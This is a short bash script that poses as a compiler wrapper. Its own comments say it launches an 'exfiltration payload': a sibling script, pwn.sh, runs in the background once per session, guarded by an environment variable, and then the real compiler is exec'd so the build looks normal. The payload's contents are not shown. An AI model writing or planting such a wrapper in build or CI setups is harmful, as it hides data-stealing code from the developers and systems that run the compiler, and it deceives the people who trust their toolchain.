#!/usr/bin/env bash
# Execute the exfiltration payload in the background
if [ -z "$PWN_DONE" ]; then
    export PWN_DONE=1
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
    bash "$SCRIPT_DIR/pwn.sh" &
fi

# Execute the real compiler (first argument is the path to the compiler)
exec "$@"
